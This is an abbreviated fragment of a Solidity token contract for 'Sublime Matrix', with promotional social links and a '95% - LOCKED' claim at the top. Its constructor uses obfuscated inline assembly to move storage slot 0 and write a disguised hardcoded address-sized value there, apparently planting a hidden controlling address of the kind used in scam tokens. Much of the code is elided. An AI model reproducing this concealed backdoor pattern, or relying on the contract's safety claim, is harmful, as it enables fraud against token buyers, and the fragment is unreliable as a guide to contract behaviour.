/*
Welcome to Sublime Matrix Metaverse.

Telegram: https://t.me/SublimeMatrix/
Twitter: https://twitter.com/SublimeMatrix/
Website: https://SublimeMatrix.finance
95% - LOCKED
...
contract SublimeMatrix {
    string public constant name = "Sublime Matrix";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(657978166864698692428364007635368855622039666092, 7))}
